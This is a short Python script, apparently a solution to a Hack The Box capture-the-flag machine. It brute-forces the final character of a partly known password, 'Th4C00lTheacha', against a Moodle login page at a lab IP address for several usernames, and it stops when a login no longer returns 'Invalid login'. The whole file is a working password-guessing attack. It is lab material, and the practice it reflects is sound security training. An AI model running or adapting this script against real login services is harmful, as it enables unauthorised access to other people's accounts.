import requests
import string
from os import system, name

user_list = ['giovanni@blackhatuni.htb', 'giovanni', 'Giovanni']
password_incomplete = 'Th4C00lTheacha'


def send_post(data):
    session = requests.Session()
    session.get('http://10.10.10.153/moodle/login/index.php')
    return session.post('http://10.10.10.153/moodle/login/index.php', data=data)


def brute_force():
    for user in user_list:
        system('clear')
        print(f"{user}:{password_incomplete}", end='', flush=True)
        for char in string.printable:
            print(f'{char}', end='', flush=True)
            respond = send_post({'anchor': '', 'username': user, 'password': f'{password_incomplete}{char}'})
            if 'Invalid login' not in respond.text:
                system('clear')
                return f"{user}:{password_incomplete}{char}"
            else:
                print('\b', end='', flush=True)


print(brute_force())
